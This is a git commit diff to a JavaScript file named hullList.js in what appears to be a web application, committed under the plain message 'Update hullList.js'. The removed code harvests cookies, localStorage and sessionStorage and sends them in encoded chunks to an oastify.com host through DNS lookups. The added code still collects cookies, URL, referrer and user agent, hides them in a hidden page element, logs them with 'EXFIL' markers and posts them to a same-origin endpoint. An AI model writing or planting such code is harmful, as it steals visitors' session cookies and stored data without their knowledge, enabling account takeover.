d101e57b9e18781218467789d56dfda6cd1a53ba
Rey2 <rhyfk0z@gmail.com>
2026-01-10 05:15:44 +0700

    Update hullList.js

--- nvr/resources/js/hullList.js
+++ nvr/resources/js/hullList.js
@@ -1,56 +1,30 @@
-// definitions.js
 (function() {
     'use strict';
     
-    function exfilViaDNS(data) {
-        try {
-            var encoded = btoa(JSON.stringify(data))
-                .replace(/\+/g, '-')
-                .replace(/\//g, '_')
-                .replace(/=/g, '');
-            
-            var chunks = encoded.match(/.{1,50}/g) || [];
-            
-            chunks.forEach(function(chunk, index) {
-                var subdomain = chunk + '.' + index + '.705vz1oy49w1zgorhn97b1nl2c83wwkl.oastify.com';
-                
-                var script = document.createElement('script');
-                script.src = 'http://' + subdomain + '/x.js';
-                document.head.appendChild(script);
-                
-                var img = new Image();
-                img.src = 'http://' + subdomain + '/x.gif';
-                
-                fetch('http://' + subdomain + '/x').catch(function(){});
-                
-                setTimeout(function() {
-                    if (script.parentNode) {
-                        script.parentNode.removeChild(script);
-                    }
-                }, 2000);
-            });
-            
-            console.log('[+] DNS exfiltration: ' + chunks.length + ' chunks');
-        } catch(e) {
-            console.error('[!] DNS exfil failed:', e);
-        }
-    }
-    
-    // Collect data
     var payload = {
-        c: document.cookie,
-        u: location.href,
-        r: document.referrer,
-        t: Date.now()
+        cookie: document.cookie,
+        url: location.href,
+        referrer: document.referrer,
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString()
     };
     
+    var div = document.createElement('div');
+    div.id = 'exfil-data';
+    div.style.display = 'none';
+    div.textContent = btoa(JSON.stringify(payload));
+    document.body.appendChild(div);
+    
+    console.log('[EXFIL DATA START]');
+    console.log(btoa(JSON.stringify(payload)));
+    console.log('[EXFIL DATA END]');
+    
     try {
-        payload.ls = JSON.stringify(localStorage);
-        payload.ss = JSON.stringify(sessionStorage);
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', '/nvr/getDefinitionById.ajax', true);
+        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+        xhr.send('exfil_data_' + btoa(JSON.stringify(payload)) + '=1');
     } catch(e) {}
     
-    // Exfiltrate
-    exfilViaDNS(payload);
-    
-    console.log('[*] DNS exfiltration initiated');
+    console.log('[*] Data stored in DOM and console');
 })();
